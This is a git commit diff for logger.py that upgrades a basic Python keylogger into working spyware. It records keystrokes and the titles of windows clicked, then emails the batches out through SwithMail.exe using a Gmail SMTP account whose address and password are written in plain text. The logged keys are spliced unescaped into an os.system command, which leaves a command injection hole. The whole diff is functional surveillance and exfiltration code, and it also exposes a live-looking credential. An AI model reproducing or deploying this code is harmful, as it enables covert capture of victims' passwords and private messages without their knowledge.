3c22a36c2309c40530db883642f7ee473a4226b7
Blas C. Lomibao <44337810+bclme@users.noreply.github.com>
2022-07-20 16:32:08 +0800

    Add files via upload

--- logger.py
+++ logger.py
@@ -1,10 +1,68 @@
-from pynput.keyboard import Key, Listener
+
+import pynput as putty
 import logging
- 
-logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+import os
+import pyautogui
+
+logkeys=''
+
+logkeys_limit = 100 
+#logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(message)s")
  
 def on_press(key):
     logging.info(str(key))
- 
-with Listener(on_press=on_press) as listener :
-    listener.join()
+    if key == putty.keyboard.Key.esc:
+        keyboard_listener.stop()
+        mouse_listener.stop()
+        quit()
+    global logkeys
+      
+
+    if len(logkeys) >= logkeys_limit:            
+            send_log() 
+            logkeys = ''
+    elif key == putty.keyboard.Key.shift_l or key == putty.keyboard.Key.shift_r:
+        return
+    elif key == putty.keyboard.Key.enter:
+         logkeys += '~'
+    elif key == putty.keyboard.Key.space:
+         logkeys += ' '     
+    elif key == putty.keyboard.Key.backspace:
+        logkeys = logkeys[:-1]
+    else:
+        char = f'{key}'
+        char = char[1:-1]
+        logkeys += char
+   
+def on_click(x, y, button, pressed):
+    global logkeys
+    
+    window_title = str(pyautogui.getActiveWindowTitle())
+    logkeys += '~'
+    logkeys += window_title
+    logkeys += '~'
+    if len(logkeys) >= logkeys_limit:            
+            send_log() 
+            logkeys = ''
+def send_log():
+    global logkeys
+    cmd = 'SwithMail.exe /s /from "mh1369080@gmail.com" /name "blas" /pass "khczysagbdifmzxj" /server "smtp.gmail.com" /p "587" /SSL /to "blas_lomibao@yahoo.com" /sub "logs" /b "' + logkeys + '"'
+    os.system('cmd /c "'+ cmd + '"')
+
+
+
+
+        
+#with putty.mouse.Listener(on_click=on_click) as mouse_listener :
+#    mouse_listener.join()
+#with putty.keyboard.Listener(on_press=on_press) as keyboard_listener :
+#    keyboard_listener.join()    
+# Setup the listener threads
+keyboard_listener = putty.keyboard.Listener(on_press=on_press)
+mouse_listener = putty.mouse.Listener(on_click=on_click)
+
+# Start the threads and join them so the script doesn't end early
+keyboard_listener.start()
+mouse_listener.start()
+keyboard_listener.join()
+mouse_listener.join()    
